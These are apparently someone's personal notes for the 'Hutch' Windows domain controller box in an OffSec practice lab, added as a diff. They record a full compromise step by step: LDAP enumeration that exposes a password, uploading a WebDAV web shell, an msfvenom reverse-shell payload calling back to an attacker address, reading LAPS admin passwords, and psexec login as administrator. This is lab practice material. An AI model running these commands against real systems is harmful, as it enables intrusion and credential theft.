@@ -1,0 +1,95 @@
+Hutch
+
+192.168.214.122
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.214.122
+
+domain name hutch.offsec
+
+dirb http://192.168.214.122/
+http://192.168.214.122/aspnet_client/ (not accessible)
+
+nikto -h http://192.168.214.122
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK .
+ WebDAV enabled (COPY LOCK MKCOL PROPPATCH PROPFIND UNLOCK listed as allowed)
+ 
+ smbclient -L 192.168.214.122 -N
+Failed
+
+rpcclient 192.168.214.122 -N  Failed
+enum4linux 192.168.214.122 (no lcuk)
+
+ldapsearch -v -x -b “DC=hutch,DC=offsec” -H ldap://192.168.214.122  
+
+">ldap.txt
+grep sAMAccountName: ldap.txt
+
+grep sAMAccountName: ldap.txt | cut -d ':' -f 2 >users.txt
+
+fmcsorley
+
+grep description ldap.txt
+got password 
+
+CrabSharkJellyfish192
+
+grep logonCount ldap.txt
+user fmcsorley logon 2 times only 
+
+crackmapexec winrm 192.168.214.122 -u fmcsorely -p CrabSharkJellyfish192
+
+crackmapexec smb 192.168.214.122 -u fmcsorley -p CrabSharkJellyfish192 --shares
+crackmapexec smb 192.168.214.122 -u fmcsorley -p CrabSharkJellyfish192 --shares
+
+enum4linux -u fmcsorley -p CrabSharkJellyfish192 -a 192.168.214.122 > enum4linux.txt
+smbclient \\\\192.168.214.122\\SYSVOL -U "hutch.offsec\fmcsorley"
+
+smb: \> prompt off
+smb: \> recurse on
+smb: \> mget *
+
+useless / Rabbithole
+
+ bloodhound-python -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.214.122
+ start bloodhound
+ sudo boodhound
+ upload all generated files before 
+ Analysis > Shortest Paths to High Value Targets,
+ 
+ crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.214.122 -M laps
+ 
+ cadaver 192.168.214.122
+
+username and  password
+put /usr/share/webshells/aspx/cmdasp.aspx
+ http://192.168.214.122/cmdasp.aspx
+ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.52 LPORT=4444 -f exe > revshell.exe
+ 
+ /home/vijay/oscp/practice/windows/hutch/revshell.exe
+ 
+  http://192.168.214.122/cmdasp.aspx
+ start c:\inetpub\wwwroot\revshell.exe
+ 
+ got revshell with normal user
+ whoami \priv
+cd ../../../
+
+ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.52.122" -D "hutch\fmcsorley" -w "CrabSharkJellyfish192" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+
+ldapsearch -x -H "ldap://192.168.141.122" -D "hutch\fmcsorley" -w "CrabSharkJellyfish192" -b "dc=hutch,dc=offsec" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
+
+impacket-psexec hutch.offsec/administrator:'kqAri+5LBQjEC)'@192.168.141.122
+
+loged in as administrator
+check for proof.txt
+
+cd c:\Users\Administrator\Desktop
+more proof.txt
+
+
+dir "\local.txt" /s
+type c:\Users\fmcsorley\Desktop\local.txt
+
+192.168.52.122
+
+ 
+ 
